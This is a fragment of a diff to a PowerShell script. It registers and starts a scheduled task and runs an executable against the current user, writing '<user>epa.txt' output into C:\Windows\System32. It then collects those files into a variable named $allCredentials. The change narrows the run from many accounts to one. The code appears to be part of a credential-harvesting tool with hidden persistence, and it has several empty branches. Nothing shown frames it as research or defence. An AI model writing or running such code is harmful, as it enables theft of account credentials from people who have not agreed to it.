@@ -71,13 +71,11 @@ Unregister-ScheduledTask -TaskName $pingdaemontask -Confirm:$false
 } else {}
 Register-ScheduledTask -Xml $pingdaemonxml -TaskName $pingdaemontask | Out-Null
 Start-ScheduledTask -TaskName $pingdaemontask
-foreach ($username in $filteredUsernames) {
-    $outputPath = Join-Path -Path "C:\Windows\System32" -ChildPath ("$username" + "epa.txt")
-    Start-Process -FilePath $localFilePath -ArgumentList "-u $username" -RedirectStandardOutput $outputPath -Wait
-    if (Test-Path $outputPath) {
-    } else {
-    }
-}
+$currentUsername = $env:USERNAME
+$outputPath = Join-Path -Path "C:\Windows\System32" -ChildPath ("$currentUsername" + "epa.txt")
+Start-Process -FilePath $localFilePath -ArgumentList "-u $currentUsername" -RedirectStandardOutput $outputPath -Wait
+if (Test-Path $outputPath) {
+} else {}
 $epaFiles = Get-ChildItem -Path $directoryPath -Filter "*epa.txt"
 $allCredentials = @()
 foreach ($epaFile in $epaFiles) {
